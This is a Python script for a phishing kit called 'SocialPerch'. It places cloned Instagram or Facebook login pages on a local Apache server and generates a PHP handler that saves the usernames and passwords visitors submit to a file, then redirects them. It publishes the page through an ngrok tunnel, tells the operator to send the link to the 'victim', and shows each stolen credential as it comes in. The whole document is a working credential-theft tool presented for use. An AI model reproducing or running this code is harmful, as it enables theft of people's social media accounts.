#!/usr/bin/python3

import os,sys
from colorama import Fore,Style
import subprocess
import pyfiglet,time
import validators
import urllib.request,json


class Phisher:

    
    #Define needed func
    def make_script(self, forward_url):
        with open('/var/www/html/post.php', 'w') as file:
            file.write(""" <?php
header('Location: %s');
function run_() {
    $handle = fopen('/var/www/html/creds.txt', 'a+');
    foreach ( $_POST as $variable => $value ) {
    
        if ($variable == "username") {
            fwrite($handle, $value);
            fwrite($handle, ':');
        }
        
        if ($variable == "password") {
            fwrite($handle, $value);
            fwrite($handle, "\\n");
            break;
        }
    }
    exit;
}
run_();
?> """% forward_url)  
        time.sleep(1)
    def start_ngrok(self):
        try:  
            print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE +"waiting...")
            print(Style.RESET_ALL + Style.BRIGHT + Fore.CYAN+"NGORK |><| FORWARDING")
            subprocess.call(["service", "apache2", "restart"])
            time.sleep(1)
            os.system("./ngrok http 80  > /dev/null &")
            time.sleep(3)
            url = urllib.request.urlopen("http://localhost:4040/api/tunnels")
            j = json.loads(url.read())
            print(Style.RESET_ALL + Style.BRIGHT + Fore.GREEN +"send this link to the victim -> ",Style.RESET_ALL + Style.BRIGHT + Fore.RED+j['tunnels'][0]['public_url'])
        except KeyboardInterrupt:
            print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE+" Have nice hunting! Goodbye")
            sys.exit()
    def banner(self):
        text = pyfiglet.figlet_format("S o c i a l P e r c h ♥")
        print(Style.RESET_ALL + Style.BRIGHT + Fore.GREEN+text)
        print(Style.RESET_ALL + Style.BRIGHT + Fore.RED+"""
        \t\t Created By C4CH3 \n\n
        """)
    def menu(self):
        subprocess.call(["chmod", "777", "/var/www/html"])
        print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE+"""\t\t[+] Please select an site: \t\t
                       \t\t1.) Instagram
                       \t\t2.) Facebook
                       \t\t3.) Coming Soon\n\n
                       
                       
                   
                        """)     
    def start(self):
        
        is_go = input(Style.RESET_ALL + Style.BRIGHT + Fore.CYAN +"[+] "+" To start please type (go) ")
        global vics
        try:    
            if is_go.lower() == "go":
                
                
                self.menu()
                if os.path.isfile("/var/www/html/index.html") == True or os.path.isfile("/var/www/html/style.css") == True:
                    os.system("rm /var/www/html/*.html")
                    os.system("rm /var/www/html/*.css")
                choice = ""
                while True:
                    choice = input(Style.RESET_ALL + Style.BRIGHT + Fore.RED+"Please select an number(1,2...) ")
                    if(choice == "1"):
                        if os.path.isfile("/var/www/html/index.html") == False:
                            subprocess.call(["cp","-rf", "/root/socialperch/sites/instagram/index.html","/var/www/html"])
                        if os.path.isfile("/var/www/html/style.css") == False:
                            subprocess.call(["cp","-rf", "/root/socialperch/sites/instagram/style.css","/var/www/html"])
                        break
                    elif(choice == "2"):
                        if os.path.isfile("/var/www/html/index.html") == False:
                            subprocess.call(["cp","-rf", "/root/socialperch/sites/facebook/index.html","/var/www/html"])
                        if os.path.isfile("/var/www/html/css") == False:
                            subprocess.call(["cp","-rf", "/root/socialperch/sites/facebook/css","/var/www/html"])
                            subprocess.call(["cp","-rf", "/root/socialperch/sites/facebook/fonts","/var/www/html"])
                            subprocess.call(["cp","-rf", "/root/socialperch/sites/facebook/images","/var/www/html"])
                        break
                    
                    else:
                        print("Wrong choice. Try again: ")
                
                
                if os.path.isfile("/root/socialperch/tmp/creds.txt"):
                    os.system("rm /root/socialperch/tmp/creds.txt")
                if os.path.isfile("/var/www/html/creds.txt"):
                    os.system("rm /var/www/html/creds.txt")

                forward = input(Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "\nForward url: exam(http//webiste.com or https://webiste.com) ")
                valid = validators.url(forward)

                while forward == "" or valid != True:
                    forward = input(Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "\nForward url: exam(http//webiste.com or https://webiste.com) ")
                    valid = validators.url(forward)
                print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE +"Please wait victim connection...")
                self.make_script(forward)
                self.start_ngrok()  
                vics = 0
                counter = 0
                while True:

                    if os.path.isfile("/var/www/html/creds.txt"):
                        with open('/var/www/html/creds.txt', 'r') as file:
                            vics = len(file.readlines())
                       
                        subprocess.call(["cp","-r", "/var/www/html/creds.txt","/root/socialperch/tmp/creds.txt"])

                        if(counter < vics):
                            with open('/var/www/html/creds.txt', 'r') as file:
                                victims = file.readlines()
                                    
                            victim = victims[len(victims)-1]
                            victim = victim.split(":")

                            print(Style.RESET_ALL + Style.BRIGHT + Fore.GREEN +"Email => "+victim[0] +" "+"Paswword => "+ victim[1])
                            pid = os.getpid()
                            print("Program PID => "+str(pid)+"\n")
                            print("Well done boy! You caught the perch.")
                            counter = vics            
            else:
                print("Please type just (go)")
        except KeyboardInterrupt:
            print(Style.RESET_ALL + Style.BRIGHT + Fore.RED +" GoodBye!")
            sys.exit()
                
           

if __name__=='__main__':
    hunt = Phisher()
    hunt.banner()
    hunt.start()